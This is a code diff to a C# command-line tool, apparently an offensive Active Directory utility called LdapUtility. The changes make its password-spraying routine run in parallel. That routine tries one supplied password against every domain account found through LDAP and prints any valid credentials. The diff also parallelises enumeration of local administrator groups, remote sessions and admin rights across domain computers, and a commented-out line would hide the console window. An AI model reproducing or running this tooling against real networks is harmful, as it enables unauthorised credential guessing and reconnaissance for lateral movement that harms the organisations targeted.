@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Text;
 using System.Net;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.DirectoryServices;
@@ -69,7 +70,7 @@ namespace LdapUtility
         static int MAX_PREFERRED_LENGTH = -1;
         static uint SC_MANAGER_ALL_ACCESS = 0xF003F;
         static string SERVICES_ACTIVE_DATABASE = "ServicesActive";
-
+        static int max_threadpool = 20;
         static void ShowDebug(Exception e, bool show)
         {
             if (show)
@@ -293,6 +294,7 @@ namespace LdapUtility
         static void Main(string[] args)
         {
             bool verboseDebug = Array.Exists(args, match => match.ToLower() == "-verbose");
+            ThreadPool.SetMaxThreads(max_threadpool, max_threadpool);
 
             // ShowWindow(GetConsoleWindow(), 0);
             if (args.Length >= 2)
@@ -322,19 +324,22 @@ namespace LdapUtility
                         List<string> users = LdapQuery(domain, query, properties, false, true);
                         Console.WriteLine("Bruteforcing {0} accounts", users.Count);
                         foreach (string u in users)
-                        {;
-                            using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, domain))
+                        {
+                            Task t = Task.Run(() =>
                             {
-                                if(verboseDebug)
+                                using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, domain))
                                 {
-                                    Console.WriteLine("Password brute force against {0}\\{1}", domain, u);
+                                    if (verboseDebug)
+                                    {
+                                        Console.WriteLine("Password brute force against {0}\\{1}", domain, u);
+                                    }
+                                    // validate the credentials
+                                    if (pc.ValidateCredentials(u, args[2]))
+                                    {
+                                        Console.WriteLine("[SUCCESS] {0}\\{1} password is {2}", domain, u, args[2]);
+                                    }
                                 }
-                                // validate the credentials
-                                if(pc.ValidateCredentials(u, args[2]))
-                                {
-                                    Console.WriteLine("[SUCCESS] {0}\\{1} password is {2}", domain, u, args[2]);
-                                }
-                            }
+                            });
                         }
                     }
                     catch (Exception e)
@@ -380,7 +385,10 @@ namespace LdapUtility
                         Console.WriteLine(String.Format("Querying {0} computer(s).", computers.Count));
                         foreach (string c in computers)
                         {
-                            DumpLocalAdminGroups(c);
+                            Task t = Task.Run(() =>
+                            {
+                                DumpLocalAdminGroups(c);
+                            });
                         }
                     }
                     catch (Exception e)
@@ -410,7 +418,10 @@ namespace LdapUtility
                             Console.WriteLine(String.Format("Querying {0} computer(s).", computers.Count));
                             foreach (string c in computers)
                             {
-                                DumpRemoteSession(c);
+                                Task t = Task.Run(() =>
+                                {
+                                    DumpRemoteSession(c);
+                                });
                             }
                         }
                     }
@@ -500,7 +511,10 @@ namespace LdapUtility
                         Console.WriteLine(String.Format("Querying {0} computer(s).", computers.Count));
                         foreach (string c in computers)
                         {
-                            CheckLocalAdminRight(c);
+                            Task t = Task.Run(() =>
+                            {
+                                CheckLocalAdminRight(c);
+                            });
                         }
                     }
                     catch (Exception e)
